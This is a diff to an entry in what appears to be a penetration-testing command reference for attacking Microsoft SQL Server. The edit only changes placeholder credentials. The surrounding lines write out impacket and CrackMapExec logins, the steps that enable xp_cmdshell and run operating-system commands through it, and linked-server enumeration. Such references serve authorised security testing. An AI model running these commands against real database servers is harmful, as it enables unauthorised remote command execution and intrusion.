@@ -5,14 +5,14 @@ description: |
 
   Reference values:
     Target IP: 10.10.10.1
-    Username: john
-    Password: password123
+    Username: pentuser
+    Password: P@ssw0rd123
 command: |
   # Connect with impacket
-  impacket-mssqlclient john:password123@10.10.10.1
+  impacket-mssqlclient pentuser:P@ssw0rd123@10.10.10.1
 
   # Connect with Windows auth
-  impacket-mssqlclient test.local/john:password123@10.10.10.1 -windows-auth
+  impacket-mssqlclient test.local/pentuser:P@ssw0rd123@10.10.10.1 -windows-auth
 
   # Enable xp_cmdshell
   EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
@@ -22,7 +22,7 @@ command: |
   EXEC xp_cmdshell 'whoami';
 
   # CrackMapExec MSSQL
-  crackmapexec mssql 10.10.10.1 -u john -p 'password123' -x "whoami"
+  crackmapexec mssql 10.10.10.1 -u pentuser -p 'P@ssw0rd123' -x "whoami"
 
   # Enumerate linked servers
   EXEC sp_linkedservers;
